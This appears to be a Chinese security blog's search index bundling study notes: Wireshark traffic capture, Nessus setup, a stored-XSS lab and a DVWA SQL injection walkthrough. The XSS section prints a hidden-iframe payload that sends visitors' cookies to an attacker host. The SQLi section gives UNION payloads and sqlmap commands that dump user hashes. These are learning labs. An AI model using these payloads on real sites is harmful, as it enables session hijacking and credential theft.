<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[网络安全实验链接]]></title>
    <url>%2F2018%2F04%2F27%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Wireshark捕获手机流量]]></title>
    <url>%2F2018%2F04%2F27%2F%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F%2F</url>
    <content type="text"><![CDATA[环境windows10 实验过程设置——&gt;网络和Internet——&gt;移动热点——&gt;开启 手机连上移动热点，被分配到的IP地址是192.168.137.248 手机在一个网址登陆 然后在站长之家查询一下域名的ip地址 得到 1IP:121.42.137.89 Wireshark过滤一下 1ip.src == 192.168.137.248 and ip.addr == 121.42.137.89 and http 过滤得到 查看Post请求，在HTML表单可以查看到提交的用户名和密码]]></content>
  </entry>
  <entry>
    <title><![CDATA[Nessus初步使用]]></title>
    <url>%2F2018%2F04%2F27%2FNessus%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[如何安装可以参考最后的参考链接 安装之后浏览器会自动跳出页面 输入用户名和密码后 继续输入激活码 更新插件出错 123PS C:\Program Files\Tenable\Nessus&gt; .\nessuscli update[Thu Apr 26 23:50:26 2018][12888.1] Could not open C:\ProgramData\Tenable\Nessus\nessus\master.key - 拒绝访问。Error: Only root can use update 使用管理员权限打开DOS 1.\nessuscli update 更新好之后进入 1https://localhost:8834/#/ 输入之前设置好了账号密码，进入 选择Advanced Scan 简单配置下，扫描本地，save 在My Scans就会出现刚刚创建的Scan，点击lauch 然后耐心等待一下 点一个进去有描述和解决方案 参考链接官方7.0文档：https://docs.tenable.com/nessus/7_0/Content/Resources/PDF/Nessus_7_0.pdf 官方6.11文档：https://docs.tenable.com/nessus/6_11/Content/Resources/PDF/Nessus_6_11.pdf Nessus离线安装及升级插件 Nessus的安装/激活/更新]]></content>
      <categories>
        <category>CTF工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[合天的跨站脚本攻击基础实验]]></title>
    <url>%2F2018%2F04%2F27%2F%E5%90%88%E5%A4%A9%E7%9A%84%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[实验环境两台互相连网Windows主机。拓扑图如下： 说明： 网络环境中有两台主机，有一台主机在实验环境可见并可登录，我们称为实验机（客户机）；另一台主机不可见，但从实验机可以访问，这台主机即为本次实验任务的攻击目标，我们称为目标机。 实验机IP为：10.1.1.78；目标机IP为：10.1.1.2。 在目标主机上安装了跨站脚本攻击的演练平台（留言系统），供本次实验使用。 实验步骤一预备任务：启动并访问留言系统​ 在预备任务中，我们将安装在目标主机上的跨站脚本攻击演练平台（留言系统）。 ​ 1、使用远程桌面登录至练习主机。 ​ 2、使用浏览器打开http://10.1.1.2页面，进入跨站脚本攻击演练平台，如下图所示： ​ 3、给留言系统添加留言，熟悉本系统环境。 ​ 4、管理留言。 ​ 点击“管理留言”，用户名：admin，密码：admin123，可以对刚留言进行管理。 存储式跨站脚本漏洞检测​ 1、登录到实验机上，用IE浏览器中打开留言系统（10.1.1.2）。 ​ 2、在留言内容中填写包含有跨站测试的脚本，提交后观察返回效果。 1&lt;script&gt;alert(&quot;XSS TEST&quot;)&lt;/script&gt; ​ 如下图所示： ​ 3、刷新留言系统，如果新加留言显示如下，则说明系统有存储式跨站漏洞。 ​ 4、思考： ​ 测试当其他用户打开这个页面时，嵌入的代码是否会执行？分析留言系统代码，为什么填写的留言脚本会被执行？ 跨站脚本攻击的危害不包括下列哪项： 【A】盗取其它用户的cookie; 【B】盗取web系统的登录帐号； 【C】即使不访问危害页面也能读取用户的cookie; 【D】获取访问用户的帐户信息； 答案选C，因为XSS攻击需要用户访问危害页面才起作用 实验步骤二利用存储式跨站漏洞窃取用户cookie 使用跨站漏洞加载恶意网页 ​ 清空实验一任务，将恶意网页（假设http://www.heetian.com）放入留言系统数据库，并在用户端执行； ​ 1、增加一留言，并在留言内容中改为 &lt;iframe src=&quot;http://www.hetianlab.com&quot;&gt;&lt;/iframe&gt;，测试返回效果。 2、隐藏恶意网页。增加留言，内容包含以下语句：&lt;iframe src=https://www.baidu.com width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/iframe&gt;，观察返回状态，网页被执行，但未在留言系统界面中显示。这样如果是攻击脚本就可以用此方法隐藏自己。 在本实验中，在提交内容中增加：&lt;iframe src=http://www.baidu.com width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/iframe&gt;，其目的是：【单选题】 【A】在访问实验的显示时，自动会访问www.baidu.com页面，而且用户在页面上查觉不到； 【B】读取访问www.baidu.com页面的cookie； 【C】在实验的显示内容页面中加入www.baidu.com页面，而且访问用户能够看到； 【D】盗取访问www.baidu.com的cookie 选A 实验步骤三利用存储式跨站漏洞窃取用户cookie ​ 1、继续添加留言，包含以下内容：&lt;script&gt;document.write(document.cookie)&lt;/script&gt; ​ 结果如图所示： 2、继续添加留言，包含以下内容： ​ &lt;script&gt;alert(document.cookie)&lt;/script&gt; 3、使用管理员登录，观察显示的cookie有什么不同？ 发现显示的多了管理员的账号和密码 4、思考：这种窃取cookie的方式有什么缺点？有什么方法可以将用户的cookie窃取出并保存下来，而且用户看不到？ ​ 5、在攻击机上使用提供的页面搭建WEB服务器，以便进一步保存浏览用户的cookie。 打开IIS 更换主目录 搭建IIS服务器过程中应注意如下几点： 1）在Web服务扩展中允许Active Server Pages服务 2）默认网站-属性-文档中添加index.asp内容页。 3）在：C:\tools\跨站脚本攻击\中的cookies文件夹属性-安全-组或用户名称（G）-添加-高级-立即查找中找到IUSR_BJHIT-YXI7NEFU8用户，选择并确定 4)给IUSR_BJHIT-YXI7NEFU8用户写入权限 搭建好服务器后，在浏览器中输入本机IP地址进行测试，如下图所示，表示web服务正常进行。 返回http://10.1.1.2页面，继续添加留言，包含以下内容： 1&lt;script&gt;document.write(&quot;&lt;iframe width=0 height=0 src=&apos;http://10.1.1.78/cookie.asp?cookie=&quot;+document.cookie+&quot;&apos;&gt;&lt;/iframe&gt;&quot;);&lt;/script&gt; 提交留言后观察目标服务器页面，没有看到异常现象，如下图所示： 再打开本地页面，查看接收浏览用户的cookie接收情况： 可以看到，已经接收到用户的cookie了，这些cookie包含了所有浏览该页面的信息，如果是登录用户的话，cookie包含了用户的用户名与密码信息。 从本实验来看，下列哪种说法是错误的：【单选题】 【A】10.1.1.2服务器提供web服务，同时具有XSS缺陷； 【B】攻击者通过攻击10.1.1.2服务器，获取该服务器相关敏感信息或数据； 【C】document.write(&quot;&lt;iframe width=0 height=0 src=&#39;http://10.1.1.78/cookie.asp?cookie=&quot;+document.cookie+&quot;&#39;&gt;&lt;/iframe&gt;&quot;);主要作用是获取用户cookie后并传递给用户操作机； 【D】一般情况下，XSS攻击对服务器安全性并没有影响； 选B，因为并没有攻击10.1.1.2服务器 参考网址：实验网址：http://www.hetianlab.com/expc.do?ce=7eb961c2-56d2-49c1-856a-c65edd1c332c 实验指导视频：http://v.youku.com/v_show/id_XODQyMzMzODE2.html?spm=a2h0k.8191407.0.0&amp;from=s1.8-1-1.2]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（4）：DVWA的SQL注入实验]]></title>
    <url>%2F2018%2F04%2F27%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%EF%BC%9ADVWA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[SQL InjectionSQL Injection，即SQL注入，SQLi，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害巨大，常常会导致整个数据库被“脱裤”，如今SQL注入仍是现在最常见的Web漏洞之一。 SQL注入分类按SQLMap中的分类来看，SQL注入类型有以下5种： 1UNION query SQL injection（可联合查询注入） Stacked queries SQL injection（可多语句查询注入） Boolean-based blind SQL injection（布尔型注入） Error-based SQL injection（报错型注入） Time-based blind SQL injection（基于时间延迟注入） SQL注入常规利用思路：11、寻找注入点，可以通过web扫描工具实现 2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息） 4、可以通过获得的用户信息，寻找后台登录。 5、利用后台或了解的进一步信息，上传webshell或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。 手工注入常规思路：11.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.查询到账户的数据 下面对四种级别的代码进行分析。 LOW等级123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; mysqli_close($GLOBALS["___mysqli_ston"]);&#125;?&gt; 分析：由代码可知，通过REQUEST方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。 利用常用注入测试的POC 判断注入输入1 输入&#39;，单引号 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;&apos;&apos;&apos; at line 1 注入id=1’ and ‘1’=’2` 返回为空 注入id=1&#39; or &#39;1&#39;=&#39;1，返回全部用户 查询表的列数id=1&#39; order by 1 # 页面正常 id=1&#39; order by 2 # 页面正常 id=1&#39; order by 3 # 页面还是正常，MySQL的注释也有#，但为啥不起作用 id=1&#39; order by 3 --，报错，说明表的有两列 确立回显名11&apos; union select 1,2# 猜数据库：11&apos; union select 1,database()-- 用户和数据库版本11&apos; union select user(),version()-- 注意：union查询结合了两个select查询结果，根据上面的order by语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用union查询结合我们构造的另外一个select.注意在使用union查询的时候需要和主查询的列数相同。 猜表名11&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()-- 得到表名：guestbook,users 猜列名1231&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273-- 1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =&apos;users&apos;-- (用编码就不用单引号，用单引号就不用编码，0x7573657273是users的十六进制) 得到列： 1id,name,password,email,birthday,user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,pid 猜用户数据列举几种payload: 1231&apos; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users -- 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- 1&apos; union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users -- 得到用户数据 1234567891011121314151617181920212223ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: adminSurname: adminID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: admin : 5f4dcc3b5aa765d61d8327deb882cf99ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: gordonb : e99a18c428cb38d5f260853678922e03ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: 1337 : 8d3533d75ae2c3966d7e0d4fcc69216bID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: pablo : 0d107d09f5bbe40cade3de5c71e9e9b7ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: smithy : 5f4dcc3b5aa765d61d8327deb882cf99 猜root用户11&apos; union select 1,group_concat(user,password_expired) from mysql.user-- 拿到root用户密码为空：rootN,mysql.sysN,PC-201702142156N 自个去数据库查询一下，结果一样 123456789mysql&gt; select Host,User,password_expired from mysql.user;+-----------+-----------------+------------------+| Host | User | password_expired |+-----------+-----------------+------------------+| localhost | root | N || localhost | mysql.sys | N || % | PC-201702142156 | N |+-----------+-----------------+------------------+3 rows in set (0.00 sec) Medium等级12345678910111213141516171819202122232425262728293031 &lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id); $query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '&lt;pre&gt;' . mysqli_error($GLOBALS["___mysqli_ston"]) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = "SELECT COUNT(*) FROM users;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS["___mysqli_ston"]);?&gt; 分析使用了mysqli_real_escape_string函数对特殊字符进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 利用1id=1&apos; 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\&apos;&apos; at line 1 改一改，还是报错 1id=1&apos; or &apos;1&apos;=&apos;1 -- 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\&apos; or \&apos;1\&apos;=\&apos;1 --&apos; at line 1 1id=1 or 1 = 1 查询成功，说明存在数字型注入。 （由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。） 猜表名：11 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 得到表名：guestbook,users 猜列名：考虑到单引号被转义，可以利用16进制进行绕过，抓包更改参数id为 11 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 # 得到列： 1id,name,password,email,birthday,user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,pid 猜用户数据抓包修改参数id为 11 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 得到用户数据：admin 5f4dcc3b5aa765d61d8327deb882cf99 High等级123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125;?&gt; 可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 漏洞利用虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 11 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # Impossible等级123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。 SQLmap在XSS的reflected输入1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 拿到cookie，要自己手打，复制PDF的有问题 1security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6 然后跑sqlmap12sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; 1234567891011121314151617181920212223sqlmap identified the following injection point(s) with a total of 211 HTTP(s) requests:---Parameter: id (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT) Payload: id=1&apos; OR NOT 9083=9083#&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1&apos; AND (SELECT 3545 FROM(SELECT COUNT(*),CONCAT(0x716a716a71,(SELECT (ELT(3545=3545,1))),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- XEQK&amp;Submit=Submit Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1&apos; AND SLEEP(5)-- tAHb&amp;Submit=Submit Type: UNION query Title: MySQL UNION query (NULL) - 2 columns Payload: id=1&apos; UNION ALL SELECT NULL,CONCAT(0x716a716a71,0x4f467165756c664d454e536f626c4a5452466d7048626c717976795a454b7a565578707376506767,0x716b707071)#&amp;Submit=Submit---[20:28:38] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: Apache 2.4.9, PHP 5.5.12back-end DBMS: MySQL &gt;= 5.0 爆数据库1python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; --current-db --tables 没想到它顺便连表也爆了 123456Database: dvwa[2 tables]+------------------------------------------------------+| guestbook || users |+------------------------------------------------------+ 爆列名12python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; -T users --columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ 爆用户名12python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; -T users --dump 123456789101112Database: dvwaTable: users[5 entries]+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://localhost/dvwa/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2018-04-25 21:55:38 | 0 || 2 | http://localhost/dvwa/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2018-04-25 21:55:38 | 0 || 3 | http://localhost/dvwa/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2018-04-25 21:55:38 | 0 || 4 | http://localhost/dvwa/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2018-04-25 21:55:38 | 0 || 5 | http://localhost/dvwa/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2018-04-25 21:55:38 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ 参考链接：新手指南：DVWA-1.9全级别教程之SQL InjectionDVWA SQL Injection 通关教程MySQL 字符串连接CONCAT()函数浅析MySQL中concat以及group_concat的使用PHP mysql_real_escape_string() 函数]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows好用的小工具]]></title>
    <url>%2F2018%2F04%2F27%2FWindows%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[介绍内容来自微信公众号：少数派 0x00 WGestures除了键盘操作外，鼠标手势也是提高效率的重要手段。借助 WGestures，你可以在任何窗口通过鼠标右键或滚轮等绘制手势来执行各种命令，实现多任务处理、媒体控制、网页导航、命令行操作等功能。你也可以根据需要按应用设置手势或添加黑名单，防止误操作。 WGestures 由国人应元东开发。他的其它一些作品包括模拟机械键盘声音的 Tickeys、轻量级词典 QingDict 和应用切换器增强 CmdTap 等。 0x01 Snipaste作为 Windows 平台上最有特色的截图软件之一，Snipaste 自诞生之日起就受到了众多关注。除了自动检测边界及文本、形状、箭头、涂鸦、高亮、马赛克等强大标注功能外，Snipaste 还能让你将截图或剪贴板内容直接固定在屏幕上，方便随时查看。 Snipaste 由博士研究生 levie 历经三年开发，目前所有功能免费且无广告，同时提供商店版及绿色免安装版，macOS 及 Linux 版也正在路上。 0x02 Wox如果你在寻找一款类似 Alfred 的快捷启动器，Wox 可以说是你的不二之选。它可以调用 Everything 进行快速全局搜索，也可以通过关键词唤起网络搜索引擎。你还可以安装各种插件，实现翻译、天气、命令行等进阶功能。 详细介绍的教程 0x03 Yu Writer一款能找到写作乐趣的 Markdown 文本编辑器 相比 macOS 的百花齐放，在 Windows 上用 Markdown 进行写作一直没有太多选择，直到 Yu Writer 横空出世。你可以利用它自由写作，并在统一的文档库中进行管理，Yu Writer 会自动保存你的写作进度及操作记录，随时回滚至以前版本。写作完成之后，你可以将文章导出为 PDF、Docx、HTML 和微信公众号等多种格式，并选择主题配色。Yu Writer 的界面同样支持更换主题，功能区也可以自由定制。 少数派之前也详细介绍过 Yu Writer，关注少数派（ID：sspaime）在后台回复「Yu Writer 」了解更多。 除了 Yu Writer 外，Windows 平台上还有为知笔记和 Leanote 等支持 Markdown 的国产笔记应用，欢迎大家下载体验。如果你只是需要一款更强大的文本编辑器，可以试试 EverEdit 或 Notepad++（台湾同胞开发）等软件，相信不会让你失望。 0x04 任务栏透明化：TranslucentTB这是一个可以让 Windows 底部的菜单栏变得模糊、完全透明的小插件。 0x05 电子书管理神器：CalibreKindle 用户耳熟能详的电子书管理神器 Calibre，也是一款高质量的开源软件。它可以管理几乎所有的电子书格式，与电子书有关的所有操作都可以在 Calibre 一个软件中完成。图书管理、格式转换、新闻获取、电子书编辑……几乎无所不能。 之前在外观上稍显落后，新版本已经改进很多，我想不到有什么理由拒绝使用它。如果你是电子书爱好者，一定不能错过这款神器。]]></content>
      <categories>
        <category>趣味玩耍</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（3）：MySQL-information_schema介绍]]></title>
    <url>%2F2018%2F04%2F26%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9AMySQL-information-schema%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[一、information_schema是什么information_schema是MySQL自带的一个信息数据库，其保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名，数据库的表，表栏的数据类型与访问权限等。 也就是说当你建立一个新的数据库，或者在已有的数据库中增删改表的话，都会记录在information_schema库中。 它提供了访问数据库元数据的方式。什么是元数据呢。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。 在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 例如下面就可以把全部数据库select出来 12345678910111213mysql&gt; select schema_name from information_schema.schemata;+--------------------+| schema_name |+--------------------+| information_schema || learning || mysql || performance_schema || sakila || sys || t2 || test |+--------------------+ 把数据库的表select出来 12345678910111213141516mysql&gt; SELECT * FROM `TABLE_CONSTRAINTS`limit 10;+--------------------+-------------------+-----------------+--------------+---------------+-----------------+| CONSTRAINT_CATALOG | CONSTRAINT_SCHEMA | CONSTRAINT_NAME | TABLE_SCHEMA | TABLE_NAME | CONSTRAINT_TYPE |+--------------------+-------------------+-----------------+--------------+---------------+-----------------+| def | auroralab | PRIMARY | auroralab | user | PRIMARY KEY || def | day06 | PRIMARY | day06 | users | PRIMARY KEY || def | dvwa | PRIMARY | dvwa | guestbook | PRIMARY KEY || def | dvwa | PRIMARY | dvwa | users | PRIMARY KEY || def | mysql | PRIMARY | mysql | columns_priv | PRIMARY KEY || def | mysql | PRIMARY | mysql | db | PRIMARY KEY || def | mysql | PRIMARY | mysql | engine_cost | PRIMARY KEY || def | mysql | PRIMARY | mysql | event | PRIMARY KEY || def | mysql | PRIMARY | mysql | func | PRIMARY KEY || def | mysql | PRIMARY | mysql | gtid_executed | PRIMARY KEY |+--------------------+-------------------+-----------------+--------------+---------------+-----------------+10 rows in set (0.47 sec) 二、information_schema数据库主要表说明SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 COLLATIONS表：提供了关于各字符集的对照信息。 COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。 KEY_COLUMN_USAGE表：描述了具有约束的键列。 ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。 VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。 TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。 参考链接：mysql information_schema介绍十分钟了结MySQL information_schema]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[滥用 MySQL LOCAL INFILE 读取客户端文件]]></title>
    <url>%2F2018%2F04%2F25%2F%E6%BB%A5%E7%94%A8%20MySQL%20LOCAL%20INFILE%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6%2F</url>
